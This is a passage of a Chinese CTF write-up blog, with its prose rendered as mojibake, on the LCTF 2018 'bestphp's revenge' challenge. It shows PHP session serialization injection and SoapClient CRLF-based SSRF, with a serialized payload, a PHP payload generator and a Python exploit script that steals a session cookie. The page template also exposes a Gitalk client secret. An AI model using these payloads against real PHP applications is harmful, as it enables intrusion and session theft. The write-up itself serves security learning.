<p><strong>å½“åºåˆ—åŒ–çš„å¼•æ“å’Œååºåˆ—åŒ–çš„å¼•æ“ä¸ä¸€è‡´æ—¶ï¼Œå°±å¯ä»¥åˆ©ç”¨å¼•æ“ä¹‹é—´çš„å·®å¼‚äº§ç”Ÿåºåˆ—åŒ–æ³¨å…¥æ¼æ´</strong></p>
</blockquote>
<p>æ¯”å¦‚è¿™é‡Œå…ˆå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡,ç„¶åå°†å…¶åºåˆ—åŒ–ä¸º <code>O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;</code></p>
<p>å¦‚æœä¼ å…¥ <code>|O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;</code> åœ¨ä½¿ç”¨<code>php_serialize</code> å¼•æ“çš„æ—¶å€™</p>
<p>åºåˆ—åŒ–åçš„session æ–‡ä»¶æ˜¯è¿™æ ·çš„ <code>a:1:&#123;s:4:&quot;name&quot;;s:31:&quot;|O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;&quot;;&#125;</code></p>
<p>è¿™æ—¶,å°†<code>a:1:&#123;s:4:&quot;name&quot;;s:31:&quot;</code> å½“åšé”®å, <code>O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;</code> å½“åšé”®å€¼,å°†é”®å€¼è¿›è¡Œååºåˆ—åŒ–è¾“å‡º,è¿™æ—¶å°±é€ æˆäº†åºåˆ—åŒ–æ³¨å…¥æ”»å‡»</p>
<h2 id="å¯ä»¥SSRF-çš„ç±»SoapClient"><a href="#å¯ä»¥SSRF-çš„ç±»SoapClient" class="headerlink" title="å¯ä»¥SSRF çš„ç±»SoapClient"></a>å¯ä»¥SSRF çš„ç±»SoapClient</h2><p> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">l3m0n å¸ˆå‚…çš„ååºåˆ—åŒ–ä¹‹PHPåŸç”Ÿç±»çš„åˆ©ç”¨</a>ä¸­è®²åˆ° SoapClient ç±»æ­é…CRLFæ³¨å…¥å¯ä»¥å®ç°SSRF, åœ¨æœ¬åœ°ç”Ÿæˆpayloadçš„æ—¶å€™,éœ€è¦ä¿®æ”¹<code>php.ini</code> ä¸­çš„ <code>;extension soap</code>  å°†æ³¨é‡Šåˆ æ‰å³å¯</p>
<p>å› ä¸ºSoapClient ç±»ä¼šè°ƒç”¨ <code>__call</code> æ–¹æ³•,å½“æ‰§è¡Œä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶,è¢«è°ƒç”¨</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200301162345.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200301163043.png"></p>
<p>æ„é€ åºåˆ—åŒ–è¦†ç›– åºåˆ—åŒ–å¼•æ“,å¹¶å°†soapç±»å†™å…¥sessionæ–‡ä»¶, <code>session_start</code> ä¼š**<code>è‡ªåŠ¨è¿›è¡Œååºåˆ—åŒ–</code>**</p>
<p>è§¦å‘<code>__call</code> å³å½“soapclient <strong>å¯¹è±¡å»è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶</strong></p>
<p>SoapClient  çš„UA å¯è¿›è¡Œ CRLFæ³¨å…¥</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200301164726.png"></p>
<p>è¿™é‡Œ<code>reset</code> å°†æ•°ç»„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªå•å…ƒ,ä¹Ÿå°±æ˜¯SoapClient, ä»ä¸Šé¢å¯ä»¥çœ‹å‡º,å¦‚æœæŠŠ$bè¦†ç›–ä¸º<code>call_user_func</code>å³å¯ å®ç°<code>__call</code> çš„è§¦å‘(call_user_func å¯ä»¥æ‰§è¡Œå¯¹è±¡ä¸­çš„æ–¹æ³•)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; $url, <span class="string">&#x27;location&#x27;</span> =&gt; $url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&quot;\r\n&quot;</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span> . urlencode($a);</span><br><span class="line"><span class="meta">?&gt;</span>ã€‚</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200301132734.png"></p>
<p>ç„¶åçš„æ­¥éª¤å°±æ˜¯,<code>?f=extract&amp;name=SoapClient</code> , POST è¿‡å» <code>b=call_user_func</code> è¦†ç›–å˜é‡b,åˆ©ç”¨<code>call_user_func</code>è°ƒç”¨SoapClientç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•,å°±ä¼šè§¦å‘<code>__call</code>æ–¹æ³•.æ‰§è¡Œssrf.å¹¶è·å¾—è®¿é—®flag.phpçš„cookie, ç„¶åç”¨è¿™ä¸ªcookieè®¿é—®ä¸€ä¸‹å°±è¡Œäº†</p>
<p>Pythonç‰ˆæœ¬: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : Eustiar</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;http://c85b635f-1224-4de2-9b64-de9a2adc0d99.node3.buuoj.cn/&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;|O:10:&quot;SoapClient&quot;:3:&#123;s:3:&quot;uri&quot;;s:3:&quot;123&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;&#x27;</span></span><br><span class="line">r = requests.session()</span><br><span class="line">data = &#123;<span class="string">&#x27;serialize_handler&#x27;</span>: <span class="string">&#x27;php_serialize&#x27;</span>&#125;</span><br><span class="line">res = r.post(url=url+<span class="string">&#x27;?f=session_start&amp;name=&#x27;</span>+payload, data=data)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">res = r.get(url)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">data = &#123;<span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;call_user_func&#x27;</span>&#125;</span><br><span class="line">res = r.post(url=url+<span class="string">&#x27;?f=extract&#x27;</span>, data=data)</span><br><span class="line">res = r.post(url=url+<span class="string">&#x27;?f=extract&#x27;</span>, data=data)  <span class="comment"># ç›¸å½“äºåˆ·æ–°é¡µé¢</span></span><br><span class="line">sessionid = re.findall(<span class="string">r&#x27;string\(26\) &quot;(.*?)&quot;&#x27;</span>, res.text)</span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=&quot;</span> + sessionid[<span class="number">0</span>]&#125;</span><br><span class="line">res = r.get(url, headers=cookie)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>



<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™:"></a>å‚è€ƒèµ„æ–™:</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0">L3m0n</a></p>
<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/">Smi1e</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHP ä¸­çš„sessionååºåˆ—åŒ–æœºåˆ¶</a></p>
<p>[<a target="_blank" rel="noopener" href="https://skysec.top/2018/11/17/2018-Xctf%20Final&amp;LCTF-Bestphp/#bestphp%E2%80%99s-revenge]">https://skysec.top/2018/11/17/2018-Xctf%20Final&amp;LCTF-Bestphp/#bestphp%E2%80%99s-revenge]</a>(<a target="_blank" rel="noopener" href="https://skysec.top/2018/11/17/2018-Xctf">https://skysec.top/2018/11/17/2018-Xctf</a> Final&amp;LCTF-Bestphp/#bestphpâ€™s-revenge)</p>
<p><a target="_blank" rel="noopener" href="https://eustiar.com/archives/521">https://eustiar.com/archives/521</a></p>
<p>æäº†ä¸€ä¸Šåˆå’Œä¸€ä¸‹åˆ, ç»ˆäºæå‡ºæ¥äº†,çœ‹äº†å¾ˆå¤šå¤§ç‰›çš„æ–‡ç« ,å’Œwp,,,å­¦åˆ°äº†å¾ˆå¤š, å“ˆå“ˆğŸ˜„</p>

    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>Authorï¼š<a href="https://hack-for.fun">m0nk3y</a>
            <p>åŸæ–‡é“¾æ¥ï¼š<a href="https://hack-for.fun/fb23.html">https://hack-for.fun/fb23.html</a>
            <p>å‘è¡¨æ—¥æœŸï¼š<a href="https://hack-for.fun/fb23.html">February 23rd 2020, 12:00:00 am</a>
            <p>æ›´æ–°æ—¥æœŸï¼š<a href="https://hack-for.fun/fb23.html">August 25th 2020, 4:45:07 pm</a>
            <p>ç‰ˆæƒå£°æ˜ï¼š<b>åŸåˆ›æ–‡ç« è½¬è½½æ—¶è¯·æ³¨æ˜å‡ºå¤„</b></p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href= "/2666.html" title= "">
                    <div class="nextTitle">[Untitled Post]</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href= "/5b36.html" title= "ä¸€ç¯‡æ–‡ç« æ·±å…¥å­¦ä¹ SQLæ³¨å…¥æ¼æ´">
                    <div class="prevTitle">ä¸€ç¯‡æ–‡ç« æ·±å…¥å­¦ä¹ SQLæ³¨å…¥æ¼æ´</div>
                </a>
            
        </li>
    </ul>
    <!-- è¯„è®ºæ’ä»¶ -->
    <!-- æ¥å¿…åŠ›Cityç‰ˆå®‰è£…ä»£ç  -->

<!-- Cityç‰ˆå®‰è£…ä»£ç å·²å®Œæˆ -->
    
    
    <!-- gitalkè¯„è®º -->

    <div id="comment-container"></div>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.6.0/dist/gitalk.css">
    <script src="https://cdn.jsdelivr.net/npm/gitalk@1.6.0/dist/gitalk.min.js"></script>
    <script>
        var gitalk = new Gitalk({
            clientID: '6ceed9c245da8d33222a',
            clientSecret: '143c0add0301972b963c8f672bf4e58a092673fb',
            id: '1582387200000',
            repo: 'Gitalk',
            owner: 'ifonly-go2019',
            admin: "ifonly-go2019",
            createIssueManually: true,
            distractionFreeMode: false
        })
        gitalk.render('comment-container')
    </script>
    
    <!-- utterancè¯„è®º -->

    <!-- partial('_partial/comment/changyan') -->
    <!--PCç‰ˆ-->


    
    

    <!-- è¯„è®º -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:ifonlysec@gmail.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="https://github.com/ifonly-go2019" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
            
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- ä¸è’œå­  -->
    
    <div class="busuanzi-container">
    
    
    <span id="busuanzi_container_site_uv">ç´¯è®¡è®¿å®¢é‡: <span id="busuanzi_value_site_uv"></span> </span>
    
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">1.</span> <span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0CTF-2016-piapiapia"><span class="toc-number">2.</span> <span class="toc-text">[0CTF 2016]piapiapia</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">3.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">4.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2019-Pythonginx"><span class="toc-number">5.</span> <span class="toc-text">[SUCTF 2019]Pythonginx</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IDNA"><span class="toc-number">5.1.</span> <span class="toc-text">IDNA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unicode-%E7%BC%96%E7%A0%81"><span class="toc-number">5.2.</span> <span class="toc-text">Unicode ç¼–ç </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASCII-%E7%BC%96%E7%A0%81"><span class="toc-number">5.3.</span> <span class="toc-text">ASCII ç¼–ç </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Url%E4%B8%AD%E7%9A%84Unicode%E6%BC%8F%E6%B4%9E%E5%BC%95%E5%8F%91%E7%9A%84%E5%9F%9F%E5%90%8D%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">5.4.</span> <span class="toc-text">Urlä¸­çš„Unicodeæ¼æ´å¼•å‘çš„åŸŸåå®‰å…¨é—®é¢˜</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E6%AC%BA%E9%AA%97"><span class="toc-number">5.4.1.</span> <span class="toc-text">åŸŸåæ¬ºéª—</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E5%88%86%E5%89%B2"><span class="toc-number">5.4.2.</span> <span class="toc-text">åŸŸååˆ†å‰²</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx"><span class="toc-number">5.5.</span> <span class="toc-text">Nginx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">5.6.</span> <span class="toc-text">è§£é¢˜è¿‡ç¨‹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox"><span class="toc-number">6.</span> <span class="toc-text">[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2018-GetShell"><span class="toc-number">7.</span> <span class="toc-text">[SUCTF 2018]GetShell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2018-annonymous"><span class="toc-number">8.</span> <span class="toc-text">[SUCTF 2018]annonymous#</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-number">9.</span> <span class="toc-text">[å®‰æ´µæ¯ 2019]easy_web#</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-number">10.</span> <span class="toc-text">[ACTF2020 æ–°ç”Ÿèµ›]Upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">11.</span> <span class="toc-text">[ACTF2020 æ–°ç”Ÿèµ›]Include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">12.</span> <span class="toc-text">[ACTF2020 æ–°ç”Ÿèµ›]Exec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile"><span class="toc-number">13.</span> <span class="toc-text">[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">14.</span> <span class="toc-text">[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-number">15.</span> <span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-Mark-loves-cat"><span class="toc-number">16.</span> <span class="toc-text">[BJDCTF2020]Mark loves cat</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">17.</span> <span class="toc-text">[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GYCTF2020-Blacklist"><span class="toc-number">18.</span> <span class="toc-text">[GYCTF2020]Blacklist</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LCTF-2018-bestphp%E2%80%99s-revenge"><span class="toc-number">19.</span> <span class="toc-text">[LCTF 2018]bestphpâ€™s revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-%E4%B8%AD%E7%9A%84session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="toc-number">19.1.</span> <span class="toc-text">PHP ä¸­çš„session ååºåˆ—åŒ–æœºåˆ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E7%9A%84%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">19.1.1.</span> <span class="toc-text">sessionçš„å­˜å‚¨æœºåˆ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">19.1.2.</span> <span class="toc-text">session åºåˆ—åŒ–æ³¨å…¥æ¼æ´</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5SSRF-%E7%9A%84%E7%B1%BBSoapClient"><span class="toc-number">19.2.</span> <span class="toc-text">å¯ä»¥SSRF çš„ç±»SoapClient</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">19.3.</span> <span class="toc-text">å‚è€ƒèµ„æ–™:</span></a></li></ol></li></ol>
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- åœ¨ejsä¸­å°†archiveæŒ‰ç…§æ—¶é—´æ’åº -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 97
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2099 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/01</span><a class="archive-post-title" href= "/2986.html" >Recent arrangements</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2020 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/62d1.html" >Chrome æµè§ˆå™¨æ‰©å±•å¼€å‘åˆè¯•</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/04</span><a class="archive-post-title" href= "/558a.html" >Cobalt Strike</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/24</span><a class="archive-post-title" href= "/abc8.html" >2020å°ç»„æ‹›æ–°æœ‰æ„Ÿ</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/18</span><a class="archive-post-title" href= "/63e5.html" >MacOS å¦‚ä½•ä¿®æ”¹è´¦æˆ·å</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/22</span><a class="archive-post-title" href= "/5dcc.html" >CSS æ³¨å…¥å­¦ä¹ ç¬”è®°</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/16</span><a class="archive-post-title" href= "/8d0f.html" >ThinkPHP5æ¼æ´å­¦ä¹ -æ–‡ä»¶åŒ…å«æ¼æ´</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/4fd81e40.html" >MacOS ä¸‹é…ç½®PHPä»£ç å®¡è®¡ç¯å¢ƒï¼ŒPHPè°ƒè¯•å­¦ä¹ </a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/66043e4c.html" >WAF Bypass å§¿åŠ¿æ€»ç»“</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/09</span><a class="archive-post-title" href= "/fb2051a0.html" >CTF-XSS</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/07</span><a class="archive-post-title" href= "/936f84c6.html" >CTF-SSTI</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/07</span><a class="archive-post-title" href= "/54449ea6.html" >Windows æœåŠ¡å™¨åº”æ€¥å“åº”</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/03</span><a class="archive-post-title" href= "/7881c78e.html" >CTF - æ–‡ä»¶åŒ…å«</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/30</span><a class="archive-post-title" href= "/dbb484a9.html" >CTF - RCE</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/30</span><a class="archive-post-title" href= "/103ec22a.html" >CTF - æ–‡ä»¶ä¸Šä¼ </a>
        </li>
    
    
